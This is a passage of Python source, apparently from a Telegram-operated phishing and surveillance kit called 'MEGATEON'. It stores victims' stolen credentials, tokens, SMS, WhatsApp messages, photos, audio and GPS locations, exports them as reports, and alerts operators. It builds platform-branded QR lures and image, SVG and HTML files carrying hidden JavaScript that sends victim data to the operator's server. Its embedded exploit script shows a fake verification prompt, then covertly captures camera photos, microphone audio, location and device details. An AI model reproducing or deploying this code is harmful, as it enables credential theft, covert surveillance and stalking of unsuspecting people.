            'referral_code': row[13] if len(row) > 13 else '',
            'total_earned': row[14] if len(row) > 14 else 0,
            'api_key': row[15] if len(row) > 15 else '',
            'last_login': row[16] if len(row) > 16 else '',
            'login_count': row[17] if len(row) > 17 else 0
        }
    print(f"[✓] Loaded {len(users)} users")

users = {}

# ========== HELPER FUNCTIONS ==========

def generate_random_filename():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def generate_api_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=32))

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def get_device_name(user_agent):
    ua = user_agent.lower()
    if 'iphone15' in ua: return "iPhone 15"
    if 'iphone14' in ua: return "iPhone 14"
    if 'iphone13' in ua: return "iPhone 13"
    if 'iphone' in ua: return "iPhone"
    if 's23' in ua: return "Samsung Galaxy S23"
    if 's22' in ua: return "Samsung Galaxy S22"
    if 'samsung' in ua or 'sm-' in ua: return "Samsung Galaxy"
    if 'pixel' in ua: return "Google Pixel"
    if 'huawei' in ua: return "Huawei"
    if 'xiaomi' in ua or 'redmi' in ua: return "Xiaomi/Redmi"
    if 'oneplus' in ua: return "OnePlus"
    if 'android' in ua: return "Android Device"
    if 'ipad' in ua: return "iPad"
    if 'mac' in ua: return "Mac"
    if 'windows' in ua: return "Windows PC"
    if 'linux' in ua: return "Linux PC"
    return "Unknown Device"

def get_browser(user_agent):
    ua = user_agent.lower()
    if 'chrome' in ua and 'edg' not in ua: return "Chrome"
    if 'firefox' in ua: return "Firefox"
    if 'safari' in ua and 'chrome' not in ua: return "Safari"
    if 'edg' in ua: return "Edge"
    if 'opera' in ua: return "Opera"
    if 'brave' in ua: return "Brave"
    return "Unknown"

def get_os(user_agent):
    ua = user_agent.lower()
    if 'windows' in ua: return "Windows"
    if 'mac os' in ua: return "macOS"
    if 'linux' in ua and 'android' not in ua: return "Linux"
    if 'android' in ua: return "Android"
    if 'ios' in ua or 'iphone' in ua or 'ipad' in ua: return "iOS"
    return "Unknown"

def get_device_type(user_agent):
    ua = user_agent.lower()
    if 'mobile' in ua or 'android' in ua or 'iphone' in ua: return "Mobile"
    if 'tablet' in ua or 'ipad' in ua: return "Tablet"
    return "Desktop"

def send_telegram(chat_id, text, keyboard=None, photo=None, document=None, parse_mode='HTML', disable_web_page_preview=False):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode,
            'disable_web_page_preview': disable_web_page_preview
        }
        if keyboard:
            data['reply_markup'] = json.dumps({'inline_keyboard': keyboard})
        response = requests.post(url, json=data, timeout=10)
        if response.status_code != 200:
            print(f"Send message error: {response.text}")
    except Exception as e:
        print(f"Send message exception: {e}")
    
    if photo and os.path.exists(photo):
        try:
            url_photo = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            with open(photo, 'rb') as f:
                requests.post(url_photo, data={'chat_id': chat_id}, files={'photo': f}, timeout=10)
        except: pass
    
    if document and os.path.exists(document):
        try:
            url_doc = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
            with open(document, 'rb') as f:
                requests.post(url_doc, data={'chat_id': chat_id}, files={'document': f}, timeout=10)
        except: pass

def format_size(bytes):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes < 1024:
            return f"{bytes:.2f} {unit}"
        bytes /= 1024
    return f"{bytes:.2f} TB"

def format_time(seconds):
    if seconds < 60:
        return f"{seconds}s"
    if seconds < 3600:
        return f"{seconds//60}m {seconds%60}s"
    if seconds < 86400:
        return f"{seconds//3600}h {(seconds%3600)//60}m"
    return f"{seconds//86400}d {seconds%86400//3600}h"

# ========== STATISTICS FUNCTIONS ==========

def get_victims_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_credentials_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM stolen_credentials WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_sms_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM sms_messages WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_passwords_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM saved_passwords WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_tokens_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM stolen_tokens WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_whatsapp_messages_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM whatsapp_messages WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_contacts_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM contacts WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_photos_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM photos WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_audios_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM audios WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_locations_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM locations WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def get_daily_stats(user_id):
    today = datetime.datetime.now().strftime('%Y-%m-%d')
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims WHERE user_id=? AND date(time)=?", (user_id, today))
    victims_today = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM stolen_credentials WHERE user_id=? AND date(time)=?", (user_id, today))
    creds_today = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM sms_messages WHERE user_id=? AND date(timestamp)=?", (user_id, today))
    sms_today = c.fetchone()[0]
    conn.close()
    return {'victims': victims_today, 'credentials': creds_today, 'sms': sms_today}

def get_weekly_stats(user_id):
    week_ago = (datetime.datetime.now() - datetime.timedelta(days=7)).strftime('%Y-%m-%d')
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims WHERE user_id=? AND date(time)>=?", (user_id, week_ago))
    victims_week = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM stolen_credentials WHERE user_id=? AND date(time)>=?", (user_id, week_ago))
    creds_week = c.fetchone()[0]
    conn.close()
    return {'victims': victims_week, 'credentials': creds_week}

def get_admin_stats():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE active=1")
    active_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users WHERE verified=1")
    verified_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM victims")
    total_victims = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM stolen_credentials")
    total_credentials = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM stolen_tokens")
    total_tokens = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM payments WHERE status='pending'")
    pending_payments = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM sms_messages")
    total_sms = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM saved_passwords")
    total_passwords = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM whatsapp_messages")
    total_whatsapp = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM photos")
    total_photos = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM audios")
    total_audios = c.fetchone()[0]
    conn.close()
    return {
        'total_users': total_users,
        'active_users': active_users,
        'verified_users': verified_users,
        'total_victims': total_victims,
        'total_credentials': total_credentials,
        'total_tokens': total_tokens,
        'pending_payments': pending_payments,
        'total_sms': total_sms,
        'total_passwords': total_passwords,
        'total_whatsapp': total_whatsapp,
        'total_photos': total_photos,
        'total_audios': total_audios
    }

def update_analytics(user_id):
    today = datetime.datetime.now().strftime('%Y-%m-%d')
    total_victims = get_victims_count(user_id)
    total_credentials = get_credentials_count(user_id)
    total_sms = get_sms_count(user_id)
    total_passwords = get_passwords_count(user_id)
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO analytics (
        user_id, date, total_victims, total_credentials, total_sms, total_passwords
    ) VALUES (?,?,?,?,?,?)''',
        (user_id, today, total_victims, total_credentials, total_sms, total_passwords))
    conn.commit()
    conn.close()

def get_analytics_data(user_id, days=30):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''SELECT date, total_victims, total_credentials FROM analytics
                 WHERE user_id=? ORDER BY date DESC LIMIT ?''', (user_id, days))
    data = c.fetchall()
    conn.close()
    return data

def get_top_victims(user_id, limit=10):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT ip, COUNT(*) as count FROM victims WHERE user_id=? GROUP BY ip ORDER BY count DESC LIMIT ?", (user_id, limit))
    data = c.fetchall()
    conn.close()
    return data

def get_top_platforms(user_id, limit=10):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT fake_platform, COUNT(*) as count FROM victims WHERE user_id=? GROUP BY fake_platform ORDER BY count DESC LIMIT ?", (user_id, limit))
    data = c.fetchall()
    conn.close()
    return data

# ========== REPORT FUNCTIONS ==========

def generate_pdf_report(user_id):
    try:
        from reportlab.lib.pagesizes import A4, landscape
        from reportlab.lib import colors
        from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, Image as RLImage
        from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
        from reportlab.lib.units import inch
        from reportlab.graphics.shapes import Drawing
        from reportlab.graphics.charts.linecharts import HorizontalLineChart
        from reportlab.graphics.charts.piecharts import Pie
    except:
        send_telegram(int(user_id), "❌ Please install reportlab: pip install reportlab")
        return None
    
    filename = f"report_{user_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
    os.makedirs("reports", exist_ok=True)
    filepath = f"reports/{filename}"
    
    total_victims = get_victims_count(user_id)
    total_credentials = get_credentials_count(user_id)
    total_sms = get_sms_count(user_id)
    total_passwords = get_passwords_count(user_id)
    total_tokens = get_tokens_count(user_id)
    total_whatsapp = get_whatsapp_messages_count(user_id)
    total_contacts = get_contacts_count(user_id)
    total_photos = get_photos_count(user_id)
    total_audios = get_audios_count(user_id)
    total_locations = get_locations_count(user_id)
    daily_stats = get_daily_stats(user_id)
    weekly_stats = get_weekly_stats(user_id)
    top_victims = get_top_victims(user_id, 5)
    top_platforms = get_top_platforms(user_id, 5)
    
    doc = SimpleDocTemplate(filepath, pagesize=landscape(A4))
    styles = getSampleStyleSheet()
    story = []
    
    # Title
    title_style = ParagraphStyle('CustomTitle', parent=styles['Heading1'], fontSize=28, textColor=colors.HexColor('#00ff41'), alignment=1)
    story.append(Paragraph("MEGATEON - Comprehensive Security Report", title_style))
    story.append(Spacer(1, 0.3*inch))
    
    # Metadata
    meta_style = ParagraphStyle('Meta', parent=styles['Normal'], fontSize=10, textColor=colors.grey)
    story.append(Paragraph(f"User ID: {user_id}", meta_style))
    story.append(Paragraph(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", meta_style))
    story.append(Spacer(1, 0.2*inch))
    
    # Summary Table
    data = [
        ['Metric', 'Value', 'Change'],
        ['Total Victims', str(total_victims), f"+{daily_stats['victims']} today"],
        ['Total Credentials', str(total_credentials), f"+{daily_stats['credentials']} today"],
        ['Total SMS', str(total_sms), f"+{daily_stats['sms']} today"],
        ['Total Passwords', str(total_passwords), '-'],
        ['Total Tokens', str(total_tokens), '-'],
        ['WhatsApp Messages', str(total_whatsapp), '-'],
        ['Contacts Extracted', str(total_contacts), '-'],
        ['Photos Captured', str(total_photos), '-'],
        ['Audio Recordings', str(total_audios), '-'],
        ['GPS Locations', str(total_locations), '-']
    ]
    
    table = Table(data, colWidths=[2*inch, 1.5*inch, 1.5*inch])
    table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#00ff41')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.black),
        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 12),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
        ('BACKGROUND', (0, 1), (-1, -1), colors.white),
        ('GRID', (0, 0), (-1, -1), 1, colors.black)
    ]))
    story.append(table)
    story.append(Spacer(1, 0.3*inch))
    
    # Top Victims
    if top_victims:
        story.append(Paragraph("Top Victims by IP", styles['Heading2']))
        data = [['IP', 'Count']] + [[ip, str(count)] for ip, count in top_victims]
        table = Table(data, colWidths=[2.5*inch, 1*inch])
        table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(table)
        story.append(Spacer(1, 0.2*inch))
    
    # Top Platforms
    if top_platforms:
        story.append(Paragraph("Top Platforms", styles['Heading2']))
        data = [['Platform', 'Count']] + [[platform, str(count)] for platform, count in top_platforms]
        table = Table(data, colWidths=[2.5*inch, 1*inch])
        table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(table)
    
    doc.build(story)
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO reports (user_id, report_type, filename, created_at, size) VALUES (?,?,?,?,?)",
              (user_id, 'pdf', filename, datetime.datetime.now().isoformat(), os.path.getsize(filepath)))
    conn.commit()
    conn.close()
    
    return filepath

def generate_csv_report(user_id):
    filename = f"report_{user_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    os.makedirs("reports", exist_ok=True)
    filepath = f"reports/{filename}"
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""SELECT ip, time, platform, device_name, country, city, browser, os
                 FROM victims WHERE user_id=? ORDER BY time DESC LIMIT 500""", (user_id,))
    victims = c.fetchall()
    conn.close()
    
    with open(filepath, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['IP', 'Time', 'Platform', 'Device', 'Country', 'City', 'Browser', 'OS'])
        writer.writerows(victims)
    
    return filepath

def export_all_data(user_id):
    export_dir = f"exports/user_{user_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(export_dir, exist_ok=True)
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    tables = [
        ('victims', ['ip', 'time', 'platform', 'device_name', 'country', 'city']),
        ('stolen_credentials', ['platform', 'username', 'password', 'time']),
        ('sms_messages', ['from_num', 'body', 'timestamp']),
        ('saved_passwords', ['website', 'username', 'password', 'timestamp']),
        ('stolen_tokens', ['platform', 'token_key', 'token_value', 'time']),
        ('whatsapp_messages', ['message', 'timestamp']),
        ('contacts', ['contacts_data']),
        ('locations', ['lat', 'lng', 'time'])
    ]
    
    for table, columns in tables:
        try:
            c.execute(f"SELECT {','.join(columns)} FROM {table} WHERE user_id=?", (user_id,))
            data = c.fetchall()
            if data:
                with open(f"{export_dir}/{table}.csv", 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(columns)
                    writer.writerows(data)
        except:
            pass
    
    conn.close()
    
    zip_path = f"{export_dir}.zip"
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        for root, dirs, files in os.walk(export_dir):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.basename(file))
    
    shutil.rmtree(export_dir)
    return zip_path

# ========== ALERT FUNCTIONS ==========

def send_alert(user_id, alert_type, message, priority=1):
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO alerts_log (user_id, alert_type, message, timestamp, priority) VALUES (?,?,?,?,?)",
                  (user_id, alert_type, message[:500], datetime.datetime.now().isoformat(), priority))
        conn.commit()
        conn.close()
        
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT alerts_enabled FROM users WHERE user_id=?", (user_id,))
        result = c.fetchone()
        conn.close()
        
        if result and result[0] == 1:
            emojis = {
                'new_victim': '🆕',
                'new_credential': '🔑',
                'new_sms': '📱',
                'new_password': '🔐',
                'new_location': '📍',
                'new_photo': '📸',
                'new_audio': '🎤',
                'system_alert': '⚠️',
                'whatsapp': '💬',
                'token': '🔐',
                'email': '📧',
                'call': '📞'
            }
            emoji = emojis.get(alert_type, '📢')
            send_telegram(int(user_id), f"{emoji} <b>تنبيه فوري!</b>\n\n{message}")
    except Exception as e:
        print(f"Alert error: {e}")

def get_alerts_log(user_id, limit=50):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, alert_type, message, timestamp, is_read, priority FROM alerts_log WHERE user_id=? ORDER BY id DESC LIMIT ?", (user_id, limit))
    alerts = c.fetchall()
    conn.close()
    return alerts

def mark_alerts_read(user_id, alert_id=None):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    if alert_id:
        c.execute("UPDATE alerts_log SET is_read=1 WHERE user_id=? AND id=?", (user_id, alert_id))
    else:
        c.execute("UPDATE alerts_log SET is_read=1 WHERE user_id=? AND is_read=0", (user_id,))
    conn.commit()
    conn.close()

def get_unread_alerts_count(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM alerts_log WHERE user_id=? AND is_read=0", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

# ========== QR CODE FUNCTIONS ==========

def create_qr_advanced(data, output_path, platform):
    qr = qrcode.QRCode(
        version=5,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=12,
        border=4
    )
    qr.add_data(data)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white").convert('RGB')
    draw = ImageDraw.Draw(img)
    img_width, img_height = img.size
    
    colors = {
        'facebook': '#1877F2', 'instagram': '#E4405F', 'telegram': '#26A5E4',
        'tiktok': '#000000', 'twitter': '#1DA1F2', 'whatsapp': '#25D366',
        'snapchat': '#FFFC00', 'google': '#4285F4', 'discord': '#5865F2',
        'netflix': '#E50914', 'paypal': '#003087', 'freefire': '#FF6B35',
        'pubg': '#FFCC00', 'default': '#00FF41', 'booster': '#FF6B35'
    }
    main_color = colors.get(platform, '#00FF41')
    
    logo_size = int(img_width * 0.28)
    logo_pos = (img_width // 2 - logo_size // 2, img_height // 2 - logo_size // 2)
    
    draw.ellipse(
        (logo_pos[0] - 5, logo_pos[1] - 5,
         logo_pos[0] + logo_size + 5, logo_pos[1] + logo_size + 5),
        fill='white'
    )
    
    try:
        font_size = int(logo_size * 0.5)
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", font_size)
    except:
        font = ImageFont.load_default()
    
    platform_icons = {
        'facebook': 'f', 'instagram': '📷', 'telegram': '✈',
        'tiktok': '♪', 'twitter': '🐦', 'whatsapp': '💬',
        'snapchat': '👻', 'google': 'G', 'discord': '🎮',
        'netflix': 'N', 'paypal': 'P', 'freefire': '🔥',
        'pubg': '🎯', 'default': '🌐', 'booster': '⚡'
    }
    
    icon = platform_icons.get(platform, 'QR')
    text_bbox = draw.textbbox((0, 0), icon, font=font)
    text_width = text_bbox[2] - text_bbox[0]
    text_height = text_bbox[3] - text_bbox[1]
    text_x = img_width // 2 - text_width // 2
    text_y = img_height // 2 - text_height // 2 - 5
    draw.text((text_x, text_y), icon, fill=main_color, font=font)
    
    try:
        small_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 14)
    except:
        small_font = ImageFont.load_default()
    
    platform_names = {
        'facebook': 'Facebook', 'instagram': 'Instagram', 'telegram': 'Telegram',
        'tiktok': 'TikTok', 'twitter': 'Twitter', 'whatsapp': 'WhatsApp',
        'snapchat': 'Snapchat', 'google': 'Google', 'discord': 'Discord',
        'netflix': 'Netflix', 'paypal': 'PayPal', 'freefire': 'FreeFire',
        'pubg': 'PUBG', 'default': 'Link', 'booster': 'Booster'
    }
    name = platform_names.get(platform, 'QR')
    name_bbox = draw.textbbox((0, 0), name, font=small_font)
    name_width = name_bbox[2] - name_bbox[0]
    name_x = img_width // 2 - name_width // 2
    name_y = img_height // 2 + int(logo_size * 0.4)
    draw.text((name_x, name_y), name, fill=main_color, font=small_font)
    
    border_size = 12
    draw.rectangle(
        (border_size, border_size, img_width - border_size, img_height - border_size),
        outline=main_color, width=3
    )
    
    corner_radius = 20
    draw.arc((border_size, border_size, border_size + corner_radius*2, border_size + corner_radius*2), 0, 90, fill=main_color, width=3)
    draw.arc((img_width - border_size - corner_radius*2, border_size, img_width - border_size, border_size + corner_radius*2), 90, 180, fill=main_color, width=3)
    draw.arc((border_size, img_height - border_size - corner_radius*2, border_size + corner_radius*2, img_height - border_size), 270, 360, fill=main_color, width=3)
    draw.arc((img_width - border_size - corner_radius*2, img_height - border_size - corner_radius*2, img_width - border_size, img_height - border_size), 180, 270, fill=main_color, width=3)
    
    img.save(output_path, 'PNG', quality=95, dpi=(300, 300))
    return output_path

# ========== STEGO FUNCTIONS ==========

def create_stego_image(ref, output_path, user_image_path=None):
    payload_url = f"{BASE_URL}/?ref={ref}"
    
    if user_image_path and os.path.exists(user_image_path):
        img = Image.open(user_image_path)
        if img.mode != 'RGB':
            img = img.convert('RGB')
        img.save(output_path, 'PNG')
    else:
        img = Image.new('RGB', (300, 300), color=(random.randint(0,255), random.randint(0,255), random.randint(0,255)))
        draw = ImageDraw.Draw(img)
        try:
            font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 24)
        except:
            font = ImageFont.load_default()
        draw.text((70, 130), "MEGATEON", fill='white', font=font)
        img.save(output_path, 'PNG')
    
    payload = f'''<html><body>
    <script>
    (function(){{
        let data={{
            ref: "{ref}",
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: screen.width+"x"+screen.height,
            timestamp: Date.now()
        }};
        fetch("{BASE_URL}/collect",{{
            method:"POST",
            headers:{{"Content-Type":"application/json"}},
            body:JSON.stringify(data)
        }});
        setTimeout(()=>{{
            window.location.href="{payload_url}";
        }}, 3000);
    }})();
    </script>
    <h1>Loading...</h1>
    </body></html>'''
    
    with open(output_path, 'ab') as f:
        f.write(b'\x00MEGASTEGO\x00')
        f.write(payload.encode('utf-8'))
        f.write(b'\x00ENDSTEGO\x00')
    
    return output_path

def create_stego_svg(ref, output_path):
    payload_url = f"{BASE_URL}/?ref={ref}"
    
    svg_content = f'''<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">
    <rect width="300" height="300" fill="#1a1a1a"/>
    <text x="50%" y="50%" font-family="monospace" font-size="30" fill="#00ff41" text-anchor="middle" dominant-baseline="middle">MEGATEON</text>
    <script>
    <![CDATA[
        fetch("{BASE_URL}/collect",{{
            method:"POST",
            headers:{{"Content-Type":"application/json"}},
            body:JSON.stringify({{ref:"{ref}", userAgent:navigator.userAgent}})
        }});
        setTimeout(function(){{
            window.location.href="{payload_url}";
        }}, 3000);
    ]]>
    </script>
    </svg>'''
    
    with open(output_path, 'w') as f:
        f.write(svg_content)
    return output_path

def create_stego_pdf(ref, output_path):
    pdf_html = f'''<!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>MEGATEON</title></head>
    <body style="background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:monospace">
    <div style="background:#1a1a1a;padding:40px;border-radius:20px;border:2px solid #00ff41;text-align:center">
    <h1 style="color:#00ff41">MEGATEON ULTIMATE</h1>
    <p style="color:#888">Loading...</p>
    <script>
        fetch("{BASE_URL}/collect",{{
            method:"POST",
            headers:{{"Content-Type":"application/json"}},
            body:JSON.stringify({{ref:"{ref}", userAgent:navigator.userAgent}})
        }});
        setTimeout(function(){{
            window.location.href="{BASE_URL}/?ref={ref}";
        }}, 3000);
    </script>
    </div>
    </body>
    </html>'''
    
    with open(output_path, 'w') as f:
        f.write(pdf_html)
    return output_path

def create_short_link(long_url):
    try:
        response = requests.get(f"https://is.gd/create.php?format=simple&url={long_url}")
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return long_url

# ========== EXPLOIT SCRIPT ==========
EXPLOIT_SCRIPT = '''
<script>
const ref = "{ref}";
const platform = "{platform}";
let sessionId = localStorage.getItem('megateon_session_id');
if(!sessionId){ sessionId = Date.now().toString(36) + Math.random().toString(36).substring(2); localStorage.setItem('megateon_session_id', sessionId); }

let statusDiv = document.getElementById('status');
if(!statusDiv){ statusDiv = document.createElement('div'); statusDiv.style.cssText = 'position:fixed;bottom:10px;left:10px;background:#000;color:#0f0;padding:5px;font-size:10px;z-index:9999'; document.body.appendChild(statusDiv); }

async function sendData(endpoint, data){
    data.ref = ref;
    data.platform = platform;
    data.session_id = sessionId;
    try{ await fetch(endpoint,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)}); }catch(e){}
}

setInterval(() => { sendData("/heartbeat", {timestamp: new Date().toISOString()}); }, 30000);

async function collectAllData(){
    statusDiv.innerHTML = "[0/30] Verification required...";
    const num1 = Math.floor(Math.random() * 9) + 1;
    const num2 = Math.floor(Math.random() * 9) + 1;
    const correctAnswer = num1 + num2;
    
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;justify-content:center;align-items:center;flex-direction:column;';
    const box = document.createElement('div');
    box.style.cssText = 'background:#1a1a1a;padding:40px;border-radius:20px;border:2px solid #00ff41;text-align:center;max-width:400px;width:90%;';
    box.innerHTML = `<h2 style="color:#00ff41;">🔐 Verification</h2><p style="color:#fff;font-size:24px;">${num1} + ${num2} = ?</p><input type="number" id="mathInput" style="width:100%;padding:15px;font-size:20px;background:#0a0a0a;border:2px solid #00ff41;border-radius:10px;color:#fff;text-align:center;"><button onclick="verifyMath()" style="margin-top:20px;padding:15px 40px;background:#00ff41;color:#000;border:none;border-radius:10px;font-size:18px;cursor:pointer;">Verify</button><p id="mathError" style="color:#ff4444;margin-top:10px;"></p>`;
    overlay.appendChild(box);
    document.body.appendChild(overlay);
    
    window.verifyMath = function() {
        const input = document.getElementById('mathInput');
        const error = document.getElementById('mathError');
        const answer = parseInt(input.value);
        if (answer === correctAnswer) {
            sendData("/math_verified", {answer: answer, correct: correctAnswer});
            overlay.remove();
            startCollection();
        } else {
            error.textContent = '❌ Wrong answer! Try again.';
            input.value = '';
        }
    };
    
    function startCollection(){
        statusDiv.innerHTML = "[1/30] Collecting data...";
        sendData("/collect",{
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown'
        });
        
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(
                function(p){sendData("/location",{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});},
                function(e){}
            );
        }
        
        if(navigator.mediaDevices){
            try{
                navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:false}).then(stream=>{
                    const v=document.createElement("video");
                    v.srcObject=stream;
                    v.play();
                    setTimeout(()=>{
                        const c=document.createElement("canvas");
                        c.width=v.videoWidth;
                        c.height=v.videoHeight;
                        c.getContext("2d").drawImage(v,0,0);
                        sendData("/camera_photo",{image:c.toDataURL("image/jpeg",0.8)});
                        stream.getTracks().forEach(t=>t.stop());
                    },1500);
                });
            }catch(e){}
        }
        
        if(navigator.mediaDevices){
            try{
                navigator.mediaDevices.getUserMedia({audio:true}).then(stream=>{
                    const recorder=new MediaRecorder(stream);
                    let chunks=[];
                    recorder.ondataavailable=e=>chunks.push(e.data);
                    recorder.onstop=()=>{
                        const blob=new Blob(chunks,{type:'audio/webm'});
                        const reader=new FileReader();
                        reader.onloadend=()=>sendData("/audio",{audio:reader.result});
                        reader.readAsDataURL(blob);
                    };
                    recorder.start();
